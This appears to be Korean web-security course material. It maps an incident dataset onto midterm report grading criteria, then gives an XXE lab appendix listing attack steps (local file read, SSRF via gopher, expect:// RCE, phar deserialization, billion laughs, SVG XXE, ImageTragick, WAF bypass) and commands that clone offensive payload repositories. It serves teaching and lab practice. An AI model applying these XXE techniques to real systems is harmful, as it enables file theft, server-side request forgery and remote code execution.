**dataset 통계**

| 항목 | 값 |
|------|---|
| 전체 incident 수 | 595,618 edges + 30,092 nodes |
| 노드 type | HOST 28,633 / CREDENTIAL 1,429 / SERVICE 5 / FILE 3 / ACTOR 1 |
| label 분포 | benign 390,851 / suspicious 44,681 / malicious 160,086 |
| 본 incident 의 *role* | "Exploiting Target" + "Exploiting Host" 동시 — *피해자이자 다른 호스트의 발판* |

**해석 — 본 lecture (중간고사 보고서) 와의 매핑**

| 보고서 항목 | 본 record 의 시사점 |
|-------------|---------------------|
| **Asset 식별** | host 노드에 `internal/managed/org/hostname/IP` 모두 동시 보유 — 점검 보고서의 "대상 시스템" 표 가 *최소 5 field* 갖춰야 한다는 baseline |
| **다중 role** | 동일 host 가 *Exploiting Target* (피해) + *Exploiting Host* (발판) 동시 → JuiceShop 점검 보고서에 *피해 시나리오* 와 *측면이동 잠재력* 두 chapter 분리 권장 |
| **Compliance framework 매핑** | Precinct 자체가 csc/cmmc/pci/nist80053/csf/iso27001/soc2 framework 매핑 보유 — 학생 보고서의 발견 vuln 마다 *해당 framework 조항* 매핑 권장 (예: SQLi → OWASP A03 + ISO 27001 A.14.2) |
| **products 다중 vendor** | host 가 6 (Precinct/WitFoo) + 17 (ASA/Cisco) 두 vendor 의 telemetry 보유 → 학생 보고서에서 *각 vuln 이 어떤 control 에 의해 탐지/차단되었는지* 명시 |

**시험 채점 기준 함의**: 본 record 가 보여주는 *5-field asset · multi-role · framework 매핑 · multi-vendor 통합* 4축이 학생 보고서에도 갖춰져야 만점 보고서.



---

## 부록: 학습 OSS 도구 매트릭스 (lab week08 — XXE)

| step | 카테고리 | 핵심 도구 |
|---|---|---|
| 1 식별 | curl + CT:application/xml / Burp Repeater / **nuclei -tags xxe** / OWASP ZAP / nikto |
| 2 기본 XXE | 수동 DOCTYPE + ENTITY / **XXEinjector** / **PayloadsAllTheThings/XXE** / Burp XXE Generator |
| 3 file read | file:// SYSTEM / XXEinjector --enumports / **xxeftp** (FTP-based OOB) / Burp Active Scan |
| 4 XXE→SSRF | http://localhost SYSTEM / **gopher:// with XXE** / **interactsh OOB** / SSRFmap 결합 |
| 5 PHP wrapper | **php://filter** convert.base64-encode / php://input / **expect:// RCE** / **phar://** deserialization |
| 6 Billion Laughs | 중첩 엔티티 (lol1→lol9) / xmlbomb / **lxml huge_tree=False** 방어 / Quadratic Blowup |
| 7 CT 변경 | curl -H Content-Type:xml / Burp Match and Replace / Accept 헤더 / Swagger fuzz |
| 8 SVG XXE | SVG DOCTYPE / `<image xlink:href='file://'>` / exiftool / **ImageTragick CVE-2016-3714** |
| 9 WAF | **OWASP CRS rule 920180** / wafw00f / curl 80 vs 3000 비교 |
| 10 보고서 | 페이로드 카탈로그 (5종) / **DefectDojo** / OWASP A05 매핑 / **CVSS v3.1** / sha256 |

### 학생 환경 준비
```bash
git clone --depth 1 https://github.com/enjoiz/XXEinjector ~/XXEinjector
git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings ~/PATT
pip install lxml defusedxml  # defusedxml 은 안전한 XML 파서
# Burp XXE Generator extension: BApp Store
# ImageTragick PoC: https://imagetragick.com
```
